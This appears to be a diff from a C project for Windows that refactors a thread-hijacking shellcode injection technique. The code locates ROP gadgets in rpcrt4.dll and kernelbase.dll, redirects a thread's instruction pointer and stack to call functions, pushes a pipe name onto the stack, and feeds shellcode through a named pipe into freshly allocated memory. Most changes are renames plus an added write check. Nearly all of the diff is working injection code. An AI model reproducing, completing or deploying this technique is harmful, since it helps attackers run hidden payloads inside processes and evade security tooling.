@@ -13,7 +13,7 @@ typedef struct Gadgets {
     UINT_PTR ret;  // ret
 } Gadgets;
 
-UINT_PTR find_gadget(const unsigned char* pattern, int sz, const char* name) {
+UINT_PTR FindGadget(const unsigned char* pattern, int sz, const char* name) {
     HMODULE base = GetModuleHandleA(name);
     if (!base) {
         return 0;
@@ -46,20 +46,20 @@ UINT_PTR find_gadget(const unsigned char* pattern, int sz, const char* name) {
     return 0; // No .text section found
 }
 
-void waitunblock(HANDLE thd) {
+void WaitUnblock(HANDLE hThread) {
     FILETIME a, b, c, d;
-    GetThreadTimes(thd, &a, &b, &c, &d);
+    GetThreadTimes(hThread, &a, &b, &c, &d);
     DWORD pt = d.dwLowDateTime;
     while (1) {
         Sleep(2);
-        GetThreadTimes(thd, &a, &b, &c, &d);
+        GetThreadTimes(hThread, &a, &b, &c, &d);
         if (d.dwLowDateTime - pt > 9) break; //when user time is >90% of total time, we're probably done
         pt = d.dwLowDateTime;
     }
     return;
 }
 
-void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d) {
+void Slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d) {
 
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
     GetThreadContext(hThread, &ctx);
@@ -81,54 +81,50 @@ void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWOR
     ResumeThread(hThread);
 }
 
-DWORD64 pushm(HANDLE thd, Gadgets gadgets, DWORD64 data) {
+DWORD64 PushData(HANDLE hThread, Gadgets gadgets, DWORD64 data) {
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
 
-    GetThreadContext(thd, &ctx);
+    GetThreadContext(hThread, &ctx);
 
     ctx.Rsp += 8;
     ctx.Rip = gadgets.pshc;
     ctx.Rdx = data;
     ctx.Rax = gadgets.jmps;
 
-    SetThreadContext(thd, &ctx);
-    ResumeThread(thd);
-    Sleep(2);
-    SuspendThread(thd);
-
-    return ctx.Rsp - 8;
-}
-
-void push_junk(HANDLE hThread, Gadgets gadgets) {
-    
-    SuspendThread(hThread);
-    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
-    
-    GetThreadContext(hThread, &ctx);
-
-    ctx.Rdx = 0;
-    ctx.Rip = gadgets.pshc;
-    ctx.Rax = gadgets.jmps;
-
     SetThreadContext(hThread, &ctx);
     ResumeThread(hThread);
     Sleep(2);
     SuspendThread(hThread);
+
+    return ctx.Rsp - 8;
 }
 
-DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {
+//void push_junk(HANDLE hThread, Gadgets gadgets) {
+//
+//    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+//    
+//    SuspendThread(hThread);
+//    GetThreadContext(hThread, &ctx);
+//
+//    ctx.Rdx = 0;
+//    ctx.Rip = gadgets.pshc;
+//    ctx.Rax = gadgets.jmps;
+//
+//    SetThreadContext(hThread, &ctx);
+//    ResumeThread(hThread);
+//    Sleep(2);
+//    SuspendThread(hThread);
+//}
 
+DWORD64 GetReturnValue(HANDLE hThread, Gadgets gadgets) {
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
     SuspendThread(hThread);
-
     GetThreadContext(hThread, &ctx);
     return ctx.Rax;
 }
 
 DWORD WINAPI ThreadFunc(LPVOID lpParam) {
-    char test[100] = {0};
     while (1) {
-        printf("[*] Victum Thread is running...\n");
         Sleep(100);
     }
     return 0;
@@ -148,30 +144,30 @@ DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL r
     ResumeThread(hThread);
 
     if (isStackAlignmentGood ^ isEvenPUSHParameters) {
-        pushm(hThread, gadgets, 0x00);
+        PushData(hThread, gadgets, 0x00);
     }
 
     // 2. PUSH function parameters
     for (uint64_t i = count; i > 4; i--) {
-        pushm(hThread, gadgets, parameters[i-1]);
+        PushData(hThread, gadgets, parameters[i-1]);
     }
 
     // 3. PUSH shadow space if required
     if (count > 4) {
-        pushm(hThread, gadgets, 0x00);
-        pushm(hThread, gadgets, 0x00);
-        pushm(hThread, gadgets, 0x00);
-        pushm(hThread, gadgets, 0x00);
+        PushData(hThread, gadgets, 0x00);
+        PushData(hThread, gadgets, 0x00);
+        PushData(hThread, gadgets, 0x00);
+        PushData(hThread, gadgets, 0x00);
     }
 
     // 4. PUSH jmps save return pointer
-    pushm(hThread, gadgets, gadgets.jmps);
+    PushData(hThread, gadgets, gadgets.jmps);
 
     // 5. PUSH function to call address
-    pushm(hThread, gadgets, funcAddr);
+    PushData(hThread, gadgets, funcAddr);
 
     // 6. Execute with ret gadget
-    slay(hThread, gadgets, 
+    Slay(hThread, gadgets, 
         (count > 0 ? parameters[0] : 0),
         (count > 1 ? parameters[1] : 0),
         (count > 2 ? parameters[2] : 0),
@@ -179,15 +175,15 @@ DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL r
     );
 
     // 7. Ensure the thread _did_ something
-    waitunblock(hThread);
+    WaitUnblock(hThread);
 
     // 8. Get return value if required
-    return (returnVal ? get_ret_val(hThread, gadgets) : 0);
+    return (returnVal ? GetReturnValue(hThread, gadgets) : 0);
 }
 
 int main(void) {
 
-    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, CREATE_SUSPENDED, NULL);
+    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
     if (hThread == NULL) {
         printf("[!] CreateThread failed with error code: %lu\n", GetLastError());
         return 1;
@@ -199,9 +195,9 @@ int main(void) {
     }
 
     Gadgets gadgets = {
-        .pshc = find_gadget("\x52\xFF\xD0", 3, "rpcrt4.dll"),     // push rdx; call rax
-        .jmps = find_gadget("\xEB\xFE",     2, "kernelbase.dll"), // jmp $
-        .ret  = find_gadget("\xC3",         1, "kernelbase.dll"), // ret
+        .pshc = FindGadget("\x52\xFF\xD0", 3, "rpcrt4.dll"),     // push rdx; call rax
+        .jmps = FindGadget("\xEB\xFE",     2, "kernelbase.dll"), // jmp $
+        .ret  = FindGadget("\xC3",         1, "kernelbase.dll"), // ret
     };
 
     if (gadgets.pshc == 0 || gadgets.jmps == 0 || gadgets.ret == 0) {
@@ -218,7 +214,7 @@ int main(void) {
     const UINT32 HeapAllocSize = 0x2000;
 
     // Set RIP to a `jmp $`, blocks when kernel exit
-    // SuspendThread(hThread);
+    SuspendThread(hThread);
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
     GetThreadContext(hThread, &ctx);
 
@@ -230,11 +226,11 @@ int main(void) {
     printf("[*] Primed thread, waiting for kernel exit...\n");
 
     // Wait for thread's user time to increase, signifying kernel exit
-    waitunblock(hThread);
+    WaitUnblock(hThread);
     printf("[*] Process exited kernel, ready for injection\n");
 
     // Push a junk val to stack, this is quite useless but it simplifies the code
-    push_junk(hThread, gadgets);
+    // push_junk(hThread, gadgets);
 
     HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HeapAllocSize, 0, 5000, NULL);
     if (pipe == INVALID_HANDLE_VALUE) {
@@ -258,7 +254,7 @@ int main(void) {
     DWORD64 namptr = 0;
     for (int j = ArraySize(pipename); j > 0; j -= 8) {
         DWORD64 num = *(DWORD64*)(pipename + j - 8);
-        namptr = pushm(hThread, gadgets, num);
+        namptr = PushData(hThread, gadgets, num);
     }
     printf("[*] Pipe name injected to stack\n");
 
@@ -278,8 +274,12 @@ int main(void) {
     printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);
 
     // Write Shellcode
-    DWORD bw = 0;
-    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
+    DWORD bytesWritten = 0;
+    WriteFile(pipe, shellcode, ArraySize(shellcode), &bytesWritten, NULL);
+    if (bytesWritten != ArraySize(shellcode)) {
+        printf("[!] Failed to write the whole shellcode to the named pipe\n");
+        return 1;
+    }
 
     // ReadFile
     CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
